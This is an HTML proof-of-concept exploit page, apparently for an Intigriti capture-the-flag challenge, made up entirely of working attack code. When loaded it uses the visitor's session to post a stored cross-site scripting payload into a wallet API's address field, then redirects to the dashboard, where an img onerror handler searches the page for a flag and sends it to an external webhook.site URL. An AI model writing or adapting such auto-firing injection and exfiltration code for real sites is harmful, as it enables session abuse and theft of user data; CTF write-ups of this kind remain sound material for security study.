<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<h1>XSS PoC</h1>
<script>
async function pwn() {
  // XSS payload to exfiltrate flag from page
  const xss = `<img src=x onerror="
    const flag = document.body.innerHTML.match(/INTIGRITI{[^}]+}/);
    if (flag) fetch('https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d/?f='+flag[0]);
  ">`;

  // Inject XSS via wallet API
  await fetch('https://challenge-0126.intigriti.io/api/wallets', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      currency: 'BTC',
      address: xss,
      balance: 1
    })
  });

  // Navigate to dashboard to trigger XSS
  window.location = 'https://challenge-0126.intigriti.io/dashboard.html';
}
pwn();
</script>
</body>
</html>
